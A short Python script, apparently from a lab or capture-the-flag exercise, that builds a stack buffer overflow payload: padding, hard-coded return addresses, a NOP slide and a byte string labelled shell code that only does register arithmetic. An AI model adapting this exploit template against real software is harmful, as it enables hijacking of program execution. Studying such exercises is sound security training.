import sys

# payload = junk + overwritten return address of vulnerable_function + return address back to main + nop slide + shell code
junk = b"A" * 44
nop_return_addr = b"\xff\xce\xff\xff"
main_return_addr = b"\x75\x0c\xda\xf7"
nop_slide = b"\x90" * 256
shell_code = b"\x31\xc0\x40\x31\xdb\x43\x31\xc9\x41\x01\xd8\x01\xc8\xc3"

payload = junk + nop_return_addr + main_return_addr + nop_slide + shell_code

sys.stdout.buffer.write(payload)
